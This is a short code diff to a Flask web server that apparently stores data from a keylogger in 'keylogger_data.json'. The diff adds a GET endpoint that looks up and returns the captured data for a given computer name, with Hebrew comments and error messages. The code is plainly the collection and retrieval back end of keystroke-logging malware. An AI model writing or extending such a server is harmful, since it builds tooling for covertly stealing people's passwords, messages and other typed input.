@@ -95,6 +95,7 @@ app = Flask(__name__)
 CORS(app)
 
 DATA_FILE = "keylogger_data.json"
+JSON_FILE_PATH = 'keylogger_data.json'
 
 
 def save_data(data):
@@ -158,6 +159,20 @@ def receive_data():
     save_data(data)
     return jsonify({"message": "Data received successfully!"}), 200
 
+@app.route('/getComputerData/<computer_name>', methods=['GET'])
+def get_computer_data(computer_name):
+    # פתיחת הקובץ וקריאת נתוני JSON
+    if not os.path.exists(JSON_FILE_PATH):
+        abort(404, description="קובץ JSON לא נמצא")
+    
+    with open(JSON_FILE_PATH, 'r', encoding='utf-8') as file:
+        data = json.load(file)
+    
+    # בדיקה אם המחשב קיים בנתונים
+    if computer_name not in data:
+        abort(404, description=f"המחשב {computer_name} לא נמצא בקובץ")
+    
+    return jsonify(data[computer_name])  # מחזירים את נתוני המחשב כ-JSON
 
 @app.route('/api/computers/<computer>', methods=['GET'])
 def get_dates_for_computer(computer):
